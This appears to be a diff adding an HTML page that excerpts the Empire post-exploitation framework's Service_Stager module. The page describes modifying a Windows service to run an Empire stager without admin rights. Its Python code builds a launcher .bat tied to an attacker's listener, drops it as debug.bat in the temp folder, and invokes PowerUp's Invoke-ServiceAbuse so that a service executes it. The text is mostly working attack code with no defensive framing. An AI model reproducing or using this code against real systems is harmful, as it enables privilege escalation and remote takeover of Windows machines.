@@ -1,0 +1,31 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Service_Stager</title>
+</head><body>Modifies a target service to execute an Empire stager<br/>
+Does not need Admin<br/>
+<br/>
+https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp<br/>
+moduleSource = self.mainMenu.installPath + &quot;/data/module_source/privesc/PowerUp.ps1<br/>
+<br/>
+<br/>
+generate the .bat launcher code to write out to the specified location<br/>
+    l = self.mainMenu.stagers.stagers['windows/launcher_bat']<br/>
+    l.options['Listener']['Value'] = self.options['Listener']['Value']<br/>
+    l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']<br/>
+    l.options['Proxy']['Value'] = self.options['Proxy']['Value']<br/>
+    l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']<br/>
+    l.options['Delete']['Value'] = &quot;True&quot;<br/>
+    launcherCode = l.generate()<br/>
+<br/>
+    # PowerShell code to write the launcher.bat out<br/>
+    scriptEnd = &quot;;$tempLoc = \&quot;$env:temp\\debug.bat\&quot;&quot;<br/>
+    scriptEnd += &quot;\n$batCode = @\&quot;\n&quot; + launcherCode + &quot;\&quot;@\n&quot;<br/>
+    scriptEnd += &quot;$batCode | Out-File -Encoding ASCII $tempLoc ;\n&quot;<br/>
+    scriptEnd += &quot;\&quot;Launcher bat written to $tempLoc `n\&quot;;\n&quot;<br/>
+ <br/>
+    if launcherCode == &quot;&quot;:<br/>
+      print helpers.color(&quot;[!] Error in launcher .bat generation.&quot;)<br/>
+      return &quot;&quot;<br/>
+<br/>
+scriptEnd += &quot;Invoke-ServiceAbuse -ServiceName \&quot;&quot;+serviceName+&quot;\&quot; -Command \&quot;C:\\Windows\\System32\\cmd.exe /C `\&quot;$env:Temp\\debug.bat`\&quot;\&quot;&quot;</body></html>
